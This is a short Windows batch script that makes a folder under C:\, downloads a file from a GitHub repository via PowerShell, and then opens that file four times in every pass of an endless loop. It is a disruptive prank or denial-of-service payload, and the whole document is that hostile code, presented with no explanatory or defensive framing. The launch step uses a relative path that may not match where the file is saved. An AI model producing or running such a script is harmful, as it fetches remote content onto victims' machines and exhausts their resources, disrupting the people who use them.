@echo off
cls

cd /d C:\
md your
cd your
md asylum

powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/Video_25a2cc85-b86a-4028-9aac-01ba5849c1e8.jpg','C:\your\asylum\Video_25a2cc85-b86a-4028-9aac-01ba5849c1e8.jpg')"

:loop
start  Video_25a2cc85-b86a-4028-9aac-01ba5849c1e8.jpg
start  Video_25a2cc85-b86a-4028-9aac-01ba5849c1e8.jpg
start  Video_25a2cc85-b86a-4028-9aac-01ba5849c1e8.jpg
start  Video_25a2cc85-b86a-4028-9aac-01ba5849c1e8.jpg
 goto loop